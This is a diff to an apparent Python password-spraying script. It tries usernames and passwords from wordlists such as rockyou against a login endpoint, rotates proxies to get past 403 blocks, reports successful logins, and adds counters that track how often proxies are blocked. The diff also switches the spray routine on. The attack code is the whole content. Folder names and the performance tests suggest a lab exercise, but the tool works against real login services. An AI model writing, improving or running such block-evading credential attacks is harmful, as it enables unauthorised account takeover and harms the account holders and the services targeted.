@@ -122,10 +122,25 @@ def delete_proxy_in_constant_time(proxy):
 
 max_retries = 3
 proxies_lock = threading.Lock()
+blocked_count = 0  # Counter for blocked proxies
+request_count = 0  # Counter for total requests
+is1000 = False
+is2000 = False
+is3000 = False
+is4000 = False
+is5000 = False
 
 def rotating_proxy(username, password):
     global proxies_list
+    global request_count
+    global blocked_count
+    global is1000
+    global is2000
+    global is3000
+    global is4000
+    global is5000
     retry_count = 0
+    # print("hi")
 
     while retry_count < max_retries:
         try:
@@ -142,6 +157,10 @@ def rotating_proxy(username, password):
                 json={"username": username, "password": password}
             )
 
+            # Increment the total request counter
+            request_count += 1
+            # print(request_count, blocked_count)
+
             # Handle response codes
             if login_response.status_code == 200:
                 print(f"[+] Successful login with {username}:{password} using proxy {proxies["http"]}")
@@ -150,22 +169,26 @@ def rotating_proxy(username, password):
                 # print(f"[-] Failed login for {username}:{password} (401 Unauthorized) using proxy {proxies["http"]}")
                 break  # No need to retry on a 401 error
             elif login_response.status_code == 403:
-                # print(f"[-] Proxy blocked (403 Forbidden) for {username}:{password} using proxy {proxies["http"]}")
+                print(f"[-] Proxy blocked (403 Forbidden) for {username}:{password} using proxy {proxies["http"]}")
                 # Remove the blocked proxy
                 with proxies_lock:
                     # proxies_list.remove(proxies)
                     delete_proxy_in_constant_time(proxies["http"])
+                    blocked_count += 1
+                    print(request_count, blocked_count, blocked_count/request_count)
+
                 retry_count += 1  # Increment retry count after a 403
             else:
                 # print(f"[-] Other failure for {username}:{password} (Status Code: {login_response.status_code}) using proxy {proxies["http"]}")
                 retry_count += 1
+            # Print blocked count every 1000 requests
 
         except requests.RequestException as e:
-            print(f"[-] Error with proxy {proxies["http"]} - Username: {username} and Password:{password} - {e}")
+            # print(f"[-] Error with proxy {proxies["http"]} - Username: {username} and Password:{password} - {e}")
             retry_count += 1  # Increment retry count on request error
         except Exception as e:
             # Handle any other exceptions that may occur
-            # print(f"[-] An unexpected error occurred - Username: {username} and Password: {password} - {e}")
+            print(f"[-] An unexpected error occurred - Username: {username} and Password: {password} - {e}")
             retry_count += 1  # Increment retry count on request error
 
         # Sleep or add a delay if needed
@@ -206,11 +229,16 @@ if __name__ == "__main__":
     base_dir = os.path.dirname(os.path.abspath(__file__))
 
     # Build paths relative to the script's directory
-    # username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top-usernames.txt')
-    # password_file_path = os.path.join(base_dir, 'data', 'TestInput', 'rockyou-500.txt')
+    username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top-usernames.txt')
+    password_file_path = os.path.join(base_dir, 'data', 'TestInput', 'rockyou-500.txt')
 
-    username_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'username.txt')
+    # username_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'username.txt')
+    # password_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'password.txt')
+
+    # Set file paths for usernames and passwords
+    username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top_1000_usernames.txt')
     password_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'password.txt')
+    # password_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top_100_passwords.txt')
     
 
     # Read the usernames and passwords from files
@@ -233,12 +261,13 @@ if __name__ == "__main__":
 
     # Run the password spray
     # UNCOMMENT THE CODE TO COUNT PERFORMANCE
-    # password_spray(usernames, passwords)
+    password_spray(usernames, passwords)
     time.sleep(2)
     print(len(proxies_list))
 
-    for threads in [1,2,5,10,20,50]:
-        measure_performance_for_multithreading(threads)
+    # UNCOMMENT FOR TESTING WITH MULTITHREADING
+    # for threads in [1,2,5,10,20,50]:
+    #     measure_performance_for_multithreading(threads)
     print(len(proxies_list))
     
 
